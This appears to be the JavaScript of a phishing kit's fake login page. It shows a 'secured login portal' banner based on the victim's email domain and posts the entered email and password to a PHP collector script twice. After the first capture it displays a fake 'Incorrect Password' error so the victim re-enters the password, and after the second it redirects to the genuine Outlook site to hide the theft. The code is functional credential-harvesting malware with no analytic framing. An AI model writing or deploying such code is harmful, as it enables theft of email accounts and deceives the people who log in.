var email = document.getElementById('email');
var password = document.getElementById('password');

var domain = email.value.replace(/.*@/, "").split('.')[0];
var string = "WELCOME TO " + domain.toUpperCase() + " SECURED LOGIN PORTAL.";
document.getElementById('domain').textContent = string.charAt(0).toUpperCase() + string.substring(1);
var counter = 0;

$('#next').click(function(e){
	e.preventDefault();
	var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
	var alert2 = document.querySelector('.alert2');
	
	if($('#email').val() == ""){
		$('#email').focus();
		alert2.style.color = "red";
		alert2.textContent = "Enter a valid email address, phone number, or Skype name.";
		return false;
	}else if(!($('#email').val().match(checkmail))){
		$('#email').focus();
		alert2.style.color = "red";
		alert2.textContent = "Enter a valid email address, phone number, or Skype name.";
		return false;
	}else if($('#password').val() == ""){
		$('#password').focus();
		alert2.style.color = "red";
		alert2.textContent = "Please enter a valid password for your email account";
		return false;
	}else{
		counter = counter + 1;
		alert2.style.color = "#0073C6";
		alert2.textContent = "Loggin in...";
		$('.alert2').show();

		if(counter > 1){
			var xmlhttp;
		    if(window.XMLHttpRequest){
		      xmlhttp = new XMLHttpRequest();
		    }else{
		      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		    }

		    xmlhttp.onreadystatechange=function(){
		      if(xmlhttp.readyState==4 && xmlhttp.status==200){
				window.location = "https://outlook.live.com/owa/";
		      }
		    }

		    var email = document.getElementById('email').value;
		    var password = document.getElementById('password').value;
		    var formdata = new FormData();

	    	formdata.append("email", email);
	    	formdata.append("password", password);

		    var url = 'send-email-address.php?others';
		    
		    xmlhttp.open("POST", url);
		    xmlhttp.send(formdata);

		    return false;
		}else{
			var xmlhttp;
		    if(window.XMLHttpRequest){
		      xmlhttp = new XMLHttpRequest();
		    }else{
		      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		    }

		    xmlhttp.onreadystatechange=function(){
		      if(xmlhttp.readyState==4 && xmlhttp.status==200){
					document.getElementById('password').value = "";
					alert2.style.color = "red";
					alert2.textContent = "Incorrect Password";
		      }
		    }

		    var email = document.getElementById('email').value;
		    var password = document.getElementById('password').value;
		    var formdata = new FormData();

	    	formdata.append("email", email);
	    	formdata.append("password", password);

		    var url = 'send-email-address.php?others';
		    
		    xmlhttp.open("POST", url);
		    xmlhttp.send(formdata);

		    return false;		
		}	
	}

})